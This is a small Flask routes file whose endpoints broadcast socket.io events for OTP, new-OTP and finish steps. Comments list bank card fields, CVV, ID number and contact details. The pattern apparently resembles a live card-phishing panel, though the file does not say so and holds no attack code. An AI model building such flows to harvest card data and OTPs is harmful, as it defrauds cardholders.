from flask import request, blueprints, redirect, session, render_template, jsonify
from config.bd import socketio
from flask_socketio import emit

events_routes = blueprints.Blueprint("events", __name__)

@events_routes.route('/otp', methods=['POST'])
def otp():
    socketio.emit('posting', {'valor': 'otp'}, namespace='/')
    
    return jsonify({'message': 'Exito'}), 200

@events_routes.route('/newOtp', methods=['POST'])
def newOtp():
    socketio.emit('posting', {'valor': 'newOtp'}, namespace='/')
    
    return jsonify({'message': 'Exito'}), 200

@events_routes.route('/finish', methods=['POST'])
def finish():
    socketio.emit('posting', {'valor': 'finish'}, namespace='/')
    
    return jsonify({'message': 'Exito'}), 200

# Banco
# Nombre
# Expiración
# CVV
# Numero de tarjeta
# Documento de identidad
# Número telefónico
# Ciudad
# Dirección
# Email
